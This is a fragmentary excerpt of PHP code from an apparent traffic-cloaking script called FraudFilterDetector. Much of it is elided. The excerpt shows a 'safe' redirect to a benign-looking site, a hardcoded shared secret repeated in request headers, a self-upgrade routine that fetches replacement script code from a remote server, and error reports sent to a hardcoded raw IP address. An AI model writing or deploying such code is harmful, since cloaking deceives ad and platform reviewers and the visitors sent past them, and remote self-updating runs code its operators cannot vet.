...
class FraudFilterDetector_rmup8 {
    ...
    function isSignatureValid($sign, $time) {
        $str = '24cd7751-f18e-41cb-9226-96ccca4d86e1.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('http://www.thegreenhousecompany.net');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 24cd7751-f18e-41cb-9226-96ccca4d86e1',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 24cd7751-f18e-41cb-9226-96ccca4d86e1';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 24cd7751-f18e-41cb-9226-96ccca4d86e1';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=rmup8&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_rmup8 = new FraudFilterDetector_rmup8();
$fraudFilterDetector_rmup8->check();
